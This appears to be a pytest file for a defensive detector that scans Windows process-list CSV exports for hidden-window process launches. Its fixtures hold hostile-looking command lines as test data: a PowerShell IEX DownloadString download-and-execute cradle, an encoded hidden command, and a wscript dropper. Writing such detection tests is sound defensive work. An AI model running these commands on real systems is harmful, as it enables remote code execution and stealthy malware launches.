"""Tests for the Security Engine and Detection Rules — Hidden Window Process
Detector. Rule-level tests use synthetic context dicts (pure functions, no
I/O). Engine-level tests write REAL process-list CSV exports to real temp
files with csv.DictWriter and run the actual HiddenWindowProcessDetector
against them (no mocking of csv.DictReader or the filesystem)."""
import csv
import os
import shutil
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.security_engine import HiddenWindowProcessDetector
from app.detection_rules import (
    rule_powershell_hidden_window_flag,
    rule_cmd_background_start,
    rule_wscript_hidden_run_pattern,
    rule_hidden_and_suspicious_location,
    rule_naturally_consoleless_interpreter,
    rule_unrecognized_export_format,
)

CSV_COLUMNS = ["Name", "CommandLine", "ProcessId", "ParentProcessId", "ExecutablePath", "User"]


def _write_csv(tmpdir, filename, rows):
    path = os.path.join(tmpdir, filename)
    with open(path, "w", newline="") as fh:
        writer = csv.DictWriter(fh, fieldnames=CSV_COLUMNS)
        writer.writeheader()
        for row in rows:
            writer.writerow(row)
    return path


# --- Rule-level unit tests (synthetic context dicts) -----------------------

def test_rule_powershell_hidden_window_flag_matches():
    ctx = {
        "name": "powershell.exe",
        "process_id": "111",
        "ps_hidden_match": "-WindowStyle Hidden",
    }
    result = rule_powershell_hidden_window_flag(ctx)
    assert result is not None
    assert result["rule_id"] == "HWP-001"
    assert result["severity"] == "high"


def test_rule_powershell_hidden_window_flag_no_match():
    ctx = {"name": "powershell.exe", "process_id": "111", "ps_hidden_match": None}
    assert rule_powershell_hidden_window_flag(ctx) is None


def test_rule_cmd_background_start_matches():
    ctx = {"name": "cmd.exe", "process_id": "222", "cmd_bg_match": "cmd /c start /B payload.exe"}
    result = rule_cmd_background_start(ctx)
    assert result is not None
    assert result["rule_id"] == "HWP-002"
    assert result["severity"] == "medium"


def test_rule_wscript_hidden_run_pattern_matches():
    ctx = {"name": "wscript.exe", "process_id": "333", "wscript_match": '.Run("cmd",0,'}
    result = rule_wscript_hidden_run_pattern(ctx)
    assert result is not None
    assert result["rule_id"] == "HWP-003"


def test_rule_hidden_and_suspicious_location_requires_both():
    ctx = {
        "name": "powershell.exe",
        "process_id": "444",
        "executable_path": r"C:\Users\Public\evil.exe",
        "any_hidden_flag": True,
        "suspicious_location": True,
    }
    result = rule_hidden_and_suspicious_location(ctx)
    assert result is not None
    assert result["rule_id"] == "HWP-004"


def test_rule_hidden_and_suspicious_location_missing_exec_path_degrades():
    ctx = {
        "name": "powershell.exe",
        "process_id": "444",
        "executable_path": "",
        "any_hidden_flag": True,
        "suspicious_location": False,
    }
    assert rule_hidden_and_suspicious_location(ctx) is None


def test_rule_hidden_and_suspicious_location_needs_hidden_flag_too():
    ctx = {
        "name": "notepad.exe",
        "process_id": "555",
        "executable_path": r"C:\ProgramData\notepad.exe",
        "any_hidden_flag": False,
        "suspicious_location": True,
    }
    assert rule_hidden_and_suspicious_location(ctx) is None


def test_rule_naturally_consoleless_interpreter_matches_without_hidden_flag():
    ctx = {"name": "pythonw.exe", "process_id": "666", "consoleless_match": True, "any_hidden_flag": False}
    result = rule_naturally_consoleless_interpreter(ctx)
    assert result is not None
    assert result["rule_id"] == "HWP-005"
    assert result["severity"] == "low"


def test_rule_naturally_consoleless_interpreter_suppressed_when_explicit_flag_present():
    ctx = {"name": "wscript.exe", "process_id": "666", "consoleless_match": True, "any_hidden_flag": True}
    assert rule_naturally_consoleless_interpreter(ctx) is None


def test_rule_unrecognized_export_format_matches():
    ctx = {"csv_path": "/tmp/bad.csv", "missing_header": True, "found_columns": ["Foo", "Bar"]}
    result = rule_unrecognized_export_format(ctx)
    assert result is not None
    assert result["rule_id"] == "HWP-006"


def test_rule_unrecognized_export_format_no_match_for_normal_row():
    ctx = {"csv_path": "/tmp/ok.csv", "missing_header": False}
    assert rule_unrecognized_export_format(ctx) is None


# --- Engine-level tests (real CSV files on disk) ----------------------------

def test_engine_detects_powershell_hidden_window_flag():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = _write_csv(tmpdir, "processes.csv", [{
            "Name": "powershell.exe",
            "CommandLine": r'powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://example.com/a.ps1\')"',
            "ProcessId": "1001",
            "ParentProcessId": "500",
            "ExecutablePath": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "User": "CORP\\jdoe",
        }])

        engine = HiddenWindowProcessDetector(csv_path)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "HWP-001" in rule_ids
        assert result["files_scanned"] == 1
        assert result["errors_count"] == 0
    finally:
        shutil.rmtree(tmpdir)


def test_engine_detects_cmd_background_start():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = _write_csv(tmpdir, "processes.csv", [{
            "Name": "cmd.exe",
            "CommandLine": r"cmd.exe /c start /B C:\Users\Public\payload.exe",
            "ProcessId": "1002",
            "ParentProcessId": "500",
            "ExecutablePath": r"C:\Windows\System32\cmd.exe",
            "User": "CORP\\jdoe",
        }])

        engine = HiddenWindowProcessDetector(csv_path)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "HWP-002" in rule_ids
    finally:
        shutil.rmtree(tmpdir)


def test_engine_detects_wscript_hidden_run_pattern():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = _write_csv(tmpdir, "processes.csv", [{
            "Name": "wscript.exe",
            "CommandLine": r'wscript.exe //B dropper.vbs -- Shell.Run("cmd.exe /c whoami",0,False)',
            "ProcessId": "1003",
            "ParentProcessId": "500",
            "ExecutablePath": r"C:\Windows\System32\wscript.exe",
            "User": "CORP\\jdoe",
        }])

        engine = HiddenWindowProcessDetector(csv_path)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "HWP-003" in rule_ids
    finally:
        shutil.rmtree(tmpdir)


def test_engine_flags_naturally_consoleless_pythonw_without_explicit_flag():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = _write_csv(tmpdir, "processes.csv", [{
            "Name": "pythonw.exe",
            "CommandLine": r"pythonw.exe C:\tools\backup_agent.py",
            "ProcessId": "1004",
            "ParentProcessId": "500",
            "ExecutablePath": r"C:\Python312\pythonw.exe",
            "User": "CORP\\jdoe",
        }])

        engine = HiddenWindowProcessDetector(csv_path)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "HWP-005" in rule_ids
        assert "HWP-001" not in rule_ids
    finally:
        shutil.rmtree(tmpdir)


def test_engine_hidden_and_suspicious_location_compound_rule():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = _write_csv(tmpdir, "processes.csv", [{
            "Name": "powershell.exe",
            "CommandLine": r"powershell.exe -w hidden -enc SQBFAFgA",
            "ProcessId": "1005",
            "ParentProcessId": "500",
            "ExecutablePath": r"C:\Users\Public\ps.exe",
            "User": "CORP\\jdoe",
        }])

        engine = HiddenWindowProcessDetector(csv_path)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "HWP-001" in rule_ids
        assert "HWP-004" in rule_ids
    finally:
        shutil.rmtree(tmpdir)


def test_engine_clean_csv_produces_no_findings():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = _write_csv(tmpdir, "processes.csv", [{
            "Name": "explorer.exe",
            "CommandLine": r"C:\Windows\explorer.exe",
            "ProcessId": "1006",
            "ParentProcessId": "500",
            "ExecutablePath": r"C:\Windows\explorer.exe",
            "User": "CORP\\jdoe",
        }])

        engine = HiddenWindowProcessDetector(csv_path)
        result = engine.run()
        assert result["findings"] == []
        assert result["files_scanned"] == 1
    finally:
        shutil.rmtree(tmpdir)


def test_engine_unrecognized_csv_header_produces_hwp006():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = os.path.join(tmpdir, "weird.csv")
        with open(csv_path, "w", newline="") as fh:
            writer = csv.DictWriter(fh, fieldnames=["Foo", "Bar"])
            writer.writeheader()
            writer.writerow({"Foo": "1", "Bar": "2"})

        engine = HiddenWindowProcessDetector(csv_path)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "HWP-006" in rule_ids
        assert result["files_scanned"] == 1
    finally:
        shutil.rmtree(tmpdir)


def test_engine_walks_directory_for_multiple_csv_files():
    tmpdir = tempfile.mkdtemp()
    try:
        _write_csv(tmpdir, "a.csv", [{
            "Name": "powershell.exe",
            "CommandLine": "powershell.exe -WindowStyle Hidden -Command dir",
            "ProcessId": "1", "ParentProcessId": "0", "ExecutablePath": "", "User": "",
        }])
        subdir = os.path.join(tmpdir, "sub")
        os.mkdir(subdir)
        _write_csv(subdir, "b.csv", [{
            "Name": "cmd.exe",
            "CommandLine": "cmd.exe /c start /B evil.exe",
            "ProcessId": "2", "ParentProcessId": "0", "ExecutablePath": "", "User": "",
        }])
        not_csv = os.path.join(tmpdir, "notes.txt")
        with open(not_csv, "w") as fh:
            fh.write("ignore me")

        engine = HiddenWindowProcessDetector(tmpdir, max_depth=3)
        result = engine.run()

        assert result["files_scanned"] == 2
        assert result["dirs_scanned"] == 2
        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "HWP-001" in rule_ids
        assert "HWP-002" in rule_ids
    finally:
        shutil.rmtree(tmpdir)


def test_engine_missing_path_counts_as_error():
    engine = HiddenWindowProcessDetector("/this/path/does/not/exist.csv")
    result = engine.run()
    assert result["errors_count"] >= 1
    assert result["findings"] == []
